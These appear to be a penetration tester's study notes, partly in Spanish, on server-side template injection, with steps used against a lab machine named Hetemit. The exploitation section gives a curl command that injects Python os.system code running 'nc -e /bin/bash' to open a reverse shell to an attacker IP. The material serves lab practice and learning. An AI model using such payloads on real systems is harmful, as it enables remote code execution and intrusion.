
## DESCRIPTION


A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.
Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server.

![[Pasted image 20230627204002.png]]

#### Mas información
* https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection


## EXPLOITATION

### OPTION 1: PYTHON
1. Lo primero es identificarla en este ejemplo había que utilizar POST

```
curl -X POST http://192.168.199.117:50000/verify -d 'code=2*2'
```

![[Pasted image 20230627203946.png]]

NO FUNCIONABA CON GET:
![[Pasted image 20230627204015.png]]

2. Hay que identificar el lenguaje de programacion para usar una RCE o otra en este caso es PYTHON:

```
curl -X POST http://192.168.199.117:50000/verify -d "code=os.system('nc -e /bin/bash 192.168.45.195 445')"
```

## MACHINES

* Hack The Box: 
* PG: Hetemit

